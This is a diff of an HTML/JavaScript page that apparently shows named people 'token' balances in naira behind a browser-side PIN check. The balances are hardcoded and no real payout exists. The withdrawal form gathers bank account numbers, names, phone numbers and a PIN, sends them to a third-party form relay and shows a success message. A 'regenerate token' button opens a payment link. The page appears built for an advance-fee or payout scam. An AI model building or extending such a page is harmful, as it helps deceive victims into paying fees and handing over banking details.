@@ -112,9 +112,20 @@
     .modal-close:hover { color: #fff;}
     .withdraw-error { color: #ffb8b8; font-size: 14px; margin-bottom: 6px; font-weight: 500;}
     .charge-note { font-size: 14px; margin-bottom: 12px; color: var(--accent);}
+    .success-message {
+      background: #1db954;
+      color: #fff;
+      padding: 14px 10px;
+      font-weight: 600;
+      border-radius: 8px;
+      margin: 14px auto 0 auto;
+      max-width: 400px;
+      display: none;
+    }
   </style>
 </head>
 <body>
+  <div class="success-message" id="successMessage"></div>
   <div class="login-form">
     <h2>Enter PIN</h2>
     <input type="password" id="accountIdInput" placeholder="Account PIN" inputmode="numeric" style="letter-spacing: 1.5px;">
@@ -172,7 +183,7 @@
     </div>
   </div>
 
-  <!-- 11 PROFILE CARDS (update names as needed) -->
+  <!-- 11 PROFILE CARDS -->
   <div class="profile-card" id="profile4171" data-account="4171">
       <h2>Account Profile</h2>
       <img src="https://via.placeholder.com/100?text=Umana41" alt="DANIEL UMANA" class="profile-pic">
@@ -396,202 +407,233 @@
   <!-- END PROFILE CARDS -->
 
   <script>
-  // --- Initialization: accountData & localStorage persistence ---
-  // Always overwrite localStorage with the latest file data on every page load
-  const defaultAccountData = {
-    "4171": {id: "4171", balance: 0, incomingDate: "2025-06-15", incomingTokenAmount: 0},
-    "3572": {id: "3572", balance: 50000, incomingDate: "2025-06-25", incomingTokenAmount: 10000},
-    "4073": {id: "4073", balance: 8000, incomingDate: "2025-06-19", incomingTokenAmount: 0},
-    "1313": {id: "1313", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
-    "5011": {id: "5011", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
-    "8103": {id: "8103", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
-    "5012": {id: "5012", balance: 0, incomingDate: "2025-07-20", incomingTokenAmount: 20000},
-    "1266": {id: "1266", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
-    "1220": {id: "1220", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
-    "2019": {id: "2019", balance: 0, incomingDate: "2025-07-05", incomingTokenAmount: 8000},
-    "1908": {id: "1908", balance: 0, incomingDate: "2025-07-09", incomingTokenAmount: 8000}
-  };
+    // --- Initialization: accountData & localStorage persistence ---
+    // Add a version to the data so we only reset localStorage if the file has changed
+    const ACCOUNT_DATA_VERSION = '20250617-v1'; // Update this if the file changes
+    const defaultAccountData = {
+      _version: ACCOUNT_DATA_VERSION,
+      "4171": {id: "4171", balance: 0, incomingDate: "2025-06-15", incomingTokenAmount: 0},
+      "3572": {id: "3572", balance: 50000, incomingDate: "2025-06-25", incomingTokenAmount: 10000},
+      "4073": {id: "4073", balance: 8000, incomingDate: "2025-06-19", incomingTokenAmount: 0},
+      "1313": {id: "1313", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
+      "5011": {id: "5011", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
+      "8103": {id: "8103", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
+      "5012": {id: "5012", balance: 0, incomingDate: "2025-07-20", incomingTokenAmount: 20000},
+      "1266": {id: "1266", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
+      "1220": {id: "1220", balance: 8000, incomingDate: "2025-06-15", incomingTokenAmount: 0},
+      "2019": {id: "2019", balance: 0, incomingDate: "2025-07-05", incomingTokenAmount: 8000},
+      "1908": {id: "1908", balance: 0, incomingDate: "2025-07-09", incomingTokenAmount: 8000}
+    };
 
-  localStorage.setItem('accountData', JSON.stringify(defaultAccountData));
-  let accountData = JSON.parse(JSON.stringify(defaultAccountData));
-
-  // --- Helper Functions ---
-  function saveAccountData() {
-    localStorage.setItem('accountData', JSON.stringify(accountData));
-  }
-  function getDisplayData(data) {
-    const today = new Date();
-    const incomingDate = new Date(data.incomingDate + "T00:00:00");
-    let displayBalance = data.balance;
-    let displayIncomingToken = 0;
-    let showIncoming = false;
-    if (today < incomingDate) {
-      displayIncomingToken = data.incomingTokenAmount || 0;
-      showIncoming = true;
-    } else {
-      displayBalance += data.incomingTokenAmount || 0;
-      displayIncomingToken = 0;
-      showIncoming = false;
-    }
-    return { displayBalance, displayIncomingToken, showIncoming, incomingDate };
-  }
-
-  function authenticate() {
-    const accountId = document.getElementById('accountIdInput').value;
-    const profiles = document.querySelectorAll('.profile-card');
-    profiles.forEach(profile => profile.style.display = 'none');
-    const profileCard = document.getElementById(`profile${accountId}`);
-    if (profileCard) {
-      profileCard.style.display = 'block';
-      document.querySelector('.login-form').style.display = 'none';
-      updateProfileCard(profileCard, accountId);
-    } else {
-      alert('Invalid Account PIN');
-    }
-  }
-
-  function withdrawToken(accountId) {
-    document.getElementById('withdrawModal').style.display = 'block';
-    document.getElementById('withdrawAccountId').value = accountId;
-    document.getElementById('withdrawAccountNumber').value = '';
-    document.getElementById('withdrawBank').selectedIndex = 0;
-    document.getElementById('withdrawAccountName').value = '';
-    document.getElementById('withdrawPhone').value = '';
-    document.getElementById('withdrawAmount').value = '';
-    document.getElementById('withdrawCharge').value = '';
-    document.getElementById('withdrawPin').value = '';
-    document.getElementById('withdrawChargeNote').textContent = 'Charge: ₦0';
-    document.getElementById('withdrawError').style.display = 'none';
-    document.getElementById('withdrawError').textContent = '';
-  }
-  function closeWithdrawModal() {
-    document.getElementById('withdrawModal').style.display = 'none';
-  }
-  function calcCharge(amount) {
-    if (amount >= 1000 && amount <= 5000) return 500;
-    if (amount >= 6000 && amount <= 10000) return 1000;
-    if (amount >= 11000 && amount <= 20000) return 2000;
-    if (amount >= 21000 && amount <= 30000) return 3000;
-    if (amount >= 31000 && amount <= 40000) return 4000;
-    if (amount >= 41000 && amount <= 50000) return 5000;
-    return 0;
-  }
-
-  document.addEventListener('DOMContentLoaded', function() {
-    // Update charge note live
-    const amountInput = document.getElementById('withdrawAmount');
-    if (amountInput) {
-      amountInput.addEventListener('input', function() {
-        let val = parseInt(this.value, 10) || 0;
-        let charge = calcCharge(val);
-        document.getElementById('withdrawCharge').value = charge;
-        document.getElementById('withdrawChargeNote').textContent = `Charge: ₦${charge.toLocaleString()}`;
-      });
-    }
-    // Set _next for form (optional, can redirect after submit)
-    document.getElementById('withdrawForm')._next.value = window.location.href;
-    // Hide all profiles on load
-    const profiles = document.querySelectorAll('.profile-card');
-    profiles.forEach(profile => {
-      profile.style.display = 'none';
-      const accountId = profile.getAttribute('data-account');
-      updateProfileCard(profile, accountId);
-    });
-    // Click outside modal to close
-    document.getElementById('withdrawModal').addEventListener('click', function(event) {
-      if (event.target === this) closeWithdrawModal();
-    });
-
-    // Prevent Enter key from submitting the withdraw form
-    document.getElementById('withdrawForm').addEventListener('keydown', function(event) {
-      if (event.key === 'Enter') {
-        event.preventDefault();
+    // Check for version. If changed, reset; else, use localStorage
+    let accountDataRaw = localStorage.getItem('accountData');
+    let accountData = {};
+    if (accountDataRaw) {
+      try {
+        let parsed = JSON.parse(accountDataRaw);
+        if (parsed._version !== ACCOUNT_DATA_VERSION) {
+          localStorage.setItem('accountData', JSON.stringify(defaultAccountData));
+          accountData = JSON.parse(JSON.stringify(defaultAccountData));
+        } else {
+          accountData = parsed;
+        }
+      } catch (e) {
+        localStorage.setItem('accountData', JSON.stringify(defaultAccountData));
+        accountData = JSON.parse(JSON.stringify(defaultAccountData));
       }
-    });
+    } else {
+      localStorage.setItem('accountData', JSON.stringify(defaultAccountData));
+      accountData = JSON.parse(JSON.stringify(defaultAccountData));
+    }
 
-    // Withdraw button logic
-    document.getElementById('withdrawBtn').addEventListener('click', function() {
-      const withdrawForm = document.getElementById('withdrawForm');
-      // Trigger the existing onsubmit logic
-      if (withdrawForm.onsubmit) {
-        const fakeEvent = { preventDefault: () => {}, returnValue: true };
-        const result = withdrawForm.onsubmit(fakeEvent);
-        // If onsubmit returns false, do not proceed
-        if (result === false || fakeEvent.returnValue === false) return;
+    function saveAccountData() {
+      localStorage.setItem('accountData', JSON.stringify(accountData));
+    }
+    function getDisplayData(data) {
+      const today = new Date();
+      const incomingDate = new Date(data.incomingDate + "T00:00:00");
+      let displayBalance = data.balance;
+      let displayIncomingToken = 0;
+      let showIncoming = false;
+      if (today < incomingDate) {
+        displayIncomingToken = data.incomingTokenAmount || 0;
+        showIncoming = true;
+      } else {
+        displayBalance += data.incomingTokenAmount || 0;
+        displayIncomingToken = 0;
+        showIncoming = false;
       }
-      // Actually submit the form
-      withdrawForm.submit();
-      // After submission, close modal and show user profile
-      closeWithdrawModal();
-      // Show the user's profile again (simulate redirect)
-      const accountId = document.getElementById('withdrawAccountId').value;
-      document.querySelectorAll('.profile-card').forEach(card => card.style.display = 'none');
+      return { displayBalance, displayIncomingToken, showIncoming, incomingDate };
+    }
+
+    function authenticate() {
+      const accountId = document.getElementById('accountIdInput').value;
+      const profiles = document.querySelectorAll('.profile-card');
+      profiles.forEach(profile => profile.style.display = 'none');
       const profileCard = document.getElementById(`profile${accountId}`);
-      if (profileCard) { profileCard.style.display = 'block'; }
-      document.querySelector('.login-form').style.display = 'none';
-    });
-  });
+      if (profileCard) {
+        profileCard.style.display = 'block';
+        document.querySelector('.login-form').style.display = 'none';
+        updateProfileCard(profileCard, accountId);
+      } else {
+        alert('Invalid Account PIN');
+      }
+    }
 
-  // --- Withdrawal Form Submission ---
-  document.getElementById('withdrawForm').onsubmit = function(e) {
-    // Basic in-browser validation (optional)
-    const accountId = document.getElementById('withdrawAccountId').value;
-    const amount = parseInt(document.getElementById('withdrawAmount').value, 10);
-    const charge = calcCharge(amount);
-    document.getElementById('withdrawCharge').value = charge;
-    // Check available balance
-    const { displayBalance } = getDisplayData(accountData[accountId]);
-    if (amount + charge > displayBalance) {
-      const errorDiv = document.getElementById('withdrawError');
-      errorDiv.style.display = 'block';
-      errorDiv.textContent = `Insufficient balance. You only have ₦${displayBalance.toLocaleString()} (including charges).`;
+    function withdrawToken(accountId) {
+      document.getElementById('withdrawModal').style.display = 'block';
+      document.getElementById('withdrawAccountId').value = accountId;
+      document.getElementById('withdrawAccountNumber').value = '';
+      document.getElementById('withdrawBank').selectedIndex = 0;
+      document.getElementById('withdrawAccountName').value = '';
+      document.getElementById('withdrawPhone').value = '';
+      document.getElementById('withdrawAmount').value = '';
+      document.getElementById('withdrawCharge').value = '';
+      document.getElementById('withdrawPin').value = '';
+      document.getElementById('withdrawChargeNote').textContent = 'Charge: ₦0';
+      document.getElementById('withdrawError').style.display = 'none';
+      document.getElementById('withdrawError').textContent = '';
+    }
+    function closeWithdrawModal() {
+      document.getElementById('withdrawModal').style.display = 'none';
+    }
+    function calcCharge(amount) {
+      if (amount >= 1000 && amount <= 5000) return 500;
+      if (amount >= 6000 && amount <= 10000) return 1000;
+      if (amount >= 11000 && amount <= 20000) return 2000;
+      if (amount >= 21000 && amount <= 30000) return 3000;
+      if (amount >= 31000 && amount <= 40000) return 4000;
+      if (amount >= 41000 && amount <= 50000) return 5000;
+      return 0;
+    }
+
+    // Show success message for 3 seconds
+    function showSuccess(msg) {
+      const box = document.getElementById('successMessage');
+      box.textContent = msg;
+      box.style.display = 'block';
+      setTimeout(() => {
+        box.style.display = 'none';
+        box.textContent = '';
+      }, 3000);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      // Update charge note live
+      const amountInput = document.getElementById('withdrawAmount');
+      if (amountInput) {
+        amountInput.addEventListener('input', function() {
+          let val = parseInt(this.value, 10) || 0;
+          let charge = calcCharge(val);
+          document.getElementById('withdrawCharge').value = charge;
+          document.getElementById('withdrawChargeNote').textContent = `Charge: ₦${charge.toLocaleString()}`;
+        });
+      }
+      // Set _next for form (optional, can redirect after submit)
+      document.getElementById('withdrawForm')._next.value = window.location.href;
+      // Hide all profiles on load
+      const profiles = document.querySelectorAll('.profile-card');
+      profiles.forEach(profile => {
+        profile.style.display = 'none';
+        const accountId = profile.getAttribute('data-account');
+        updateProfileCard(profile, accountId);
+      });
+      // Click outside modal to close
+      document.getElementById('withdrawModal').addEventListener('click', function(event) {
+        if (event.target === this) closeWithdrawModal();
+      });
+
+      // Prevent Enter key from submitting the withdraw form
+      document.getElementById('withdrawForm').addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+          event.preventDefault();
+        }
+      });
+
+      // Withdraw button logic
+      document.getElementById('withdrawBtn').addEventListener('click', function() {
+        const withdrawForm = document.getElementById('withdrawForm');
+        // Validate & deduct balance
+        if (withdrawForm.onsubmit) {
+          const fakeEvent = { preventDefault: () => {}, returnValue: true };
+          const result = withdrawForm.onsubmit(fakeEvent);
+          if (result === false || fakeEvent.returnValue === false) return;
+        }
+        // Actually submit the form to formsubmit.co
+        withdrawForm.submit();
+
+        // After submission, close modal and update profile
+        closeWithdrawModal();
+        // Show user profile again
+        const accountId = document.getElementById('withdrawAccountId').value;
+        document.querySelectorAll('.profile-card').forEach(card => card.style.display = 'none');
+        const profileCard = document.getElementById(`profile${accountId}`);
+        if (profileCard) { profileCard.style.display = 'block'; }
+        document.querySelector('.login-form').style.display = 'none';
+        // Show success message
+        showSuccess('Withdrawal request submitted successfully!');
+      });
+    });
+
+    // Withdrawal Form Submission: Deduct balance and save
+    document.getElementById('withdrawForm').onsubmit = function(e) {
+      const accountId = document.getElementById('withdrawAccountId').value;
+      const amount = parseInt(document.getElementById('withdrawAmount').value, 10);
+      const charge = calcCharge(amount);
+      document.getElementById('withdrawCharge').value = charge;
+      // Check available balance
+      const { displayBalance } = getDisplayData(accountData[accountId]);
+      if (amount + charge > displayBalance) {
+        const errorDiv = document.getElementById('withdrawError');
+        errorDiv.style.display = 'block';
+        errorDiv.textContent = `Insufficient balance. You only have ₦${displayBalance.toLocaleString()} (including charges).`;
+        e.preventDefault();
+        return false;
+      }
+      // Deduct from balance and persist to localStorage
+      const today = new Date();
+      const incomingDate = new Date(accountData[accountId].incomingDate + "T00:00:00");
+      if (today < incomingDate) {
+        accountData[accountId].balance -= (amount + charge);
+        if (accountData[accountId].balance < 0) accountData[accountId].balance = 0;
+      } else {
+        let total = (accountData[accountId].balance || 0) + (accountData[accountId].incomingTokenAmount || 0);
+        total -= (amount + charge);
+        accountData[accountId].balance = Math.max(total, 0);
+        accountData[accountId].incomingTokenAmount = 0;
+      }
+      saveAccountData();
+      // Update UI
+      const profileCard = document.getElementById(`profile${accountId}`);
+      updateProfileCard(profileCard, accountId);
+      closeWithdrawModal();
+      // Do not allow form to submit naturally; handled by button
       e.preventDefault();
       return false;
-    }
-    // Deduct from balance and persist to localStorage
-    const today = new Date();
-    const incomingDate = new Date(accountData[accountId].incomingDate + "T00:00:00");
-    if (today < incomingDate) {
-      accountData[accountId].balance -= (amount + charge);
-      if (accountData[accountId].balance < 0) accountData[accountId].balance = 0;
-    } else {
-      let total = (accountData[accountId].balance || 0) + (accountData[accountId].incomingTokenAmount || 0);
-      total -= (amount + charge);
-      accountData[accountId].balance = Math.max(total, 0);
-      accountData[accountId].incomingTokenAmount = 0;
-    }
-    saveAccountData();
-    // Update UI
-    const profileCard = document.getElementById(`profile${accountId}`);
-    updateProfileCard(profileCard, accountId);
-    closeWithdrawModal();
-    // Do not allow form to submit naturally; handled by Withdraw button
-    e.preventDefault();
-    return false;
-  };
+    };
 
-  function regenerateToken(accountId) {
-    window.open("https://paystack.com/pay/gw3o7xxgvo", "_blank");
-  }
-  function updateProfileCard(profileCard, accountId) {
-    const data = accountData[accountId];
-    if (!data) return;
-    const balanceSpan = profileCard.querySelector('.balance-value');
-    const noticeDiv = profileCard.querySelector('.incoming-token-notice');
-    const incomingTokenAmountSpan = profileCard.querySelector('.incoming-token-amount');
-    const incomingDateSpan = profileCard.querySelector('.incoming-date');
-    const { displayBalance, displayIncomingToken, showIncoming, incomingDate } = getDisplayData(data);
-    balanceSpan.textContent = "₦" + displayBalance.toLocaleString();
-    incomingTokenAmountSpan.textContent = "₦" + displayIncomingToken.toLocaleString();
-    incomingDateSpan.textContent = showIncoming ? data.incomingDate : "";
-    if (showIncoming) {
-      noticeDiv.style.display = "block";
-      noticeDiv.textContent = `Incoming Token of ₦${displayIncomingToken.toLocaleString()} will be added to your balance on ${incomingDate.toDateString()}.`;
-    } else {
-      noticeDiv.style.display = "none";
-      noticeDiv.textContent = "";
+    function regenerateToken(accountId) {
+      window.open("https://paystack.com/pay/gw3o7xxgvo", "_blank");
     }
-  }
+    function updateProfileCard(profileCard, accountId) {
+      const data = accountData[accountId];
+      if (!data) return;
+      const balanceSpan = profileCard.querySelector('.balance-value');
+      const noticeDiv = profileCard.querySelector('.incoming-token-notice');
+      const incomingTokenAmountSpan = profileCard.querySelector('.incoming-token-amount');
+      const incomingDateSpan = profileCard.querySelector('.incoming-date');
+      const { displayBalance, displayIncomingToken, showIncoming, incomingDate } = getDisplayData(data);
+      balanceSpan.textContent = "₦" + displayBalance.toLocaleString();
+      incomingTokenAmountSpan.textContent = "₦" + displayIncomingToken.toLocaleString();
+      incomingDateSpan.textContent = showIncoming ? data.incomingDate : "";
+      if (showIncoming) {
+        noticeDiv.style.display = "block";
+        noticeDiv.textContent = `Incoming Token of ₦${displayIncomingToken.toLocaleString()} will be added to your balance on ${incomingDate.toDateString()}.`;
+      } else {
+        noticeDiv.style.display = "none";
+        noticeDiv.textContent = "";
+      }
+    }
   </script>
 </body>
 </html>
